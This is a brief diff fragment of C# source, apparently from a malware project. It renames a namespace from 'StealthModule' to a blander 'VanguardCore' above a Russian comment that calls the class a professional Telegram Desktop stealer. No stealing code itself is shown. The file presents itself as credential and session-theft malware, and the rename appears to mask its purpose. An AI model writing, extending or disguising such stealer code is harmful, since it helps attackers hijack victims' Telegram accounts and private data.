@@ -7,7 +7,7 @@ using System.Runtime.InteropServices;
 using System.Text;
 using System.Text.RegularExpressions;
 
-namespace StealthModule
+namespace VanguardCore
 {
     /// <summary>
     /// Профессиональный стиллер Telegram Desktop (Stealth + NativeApi)
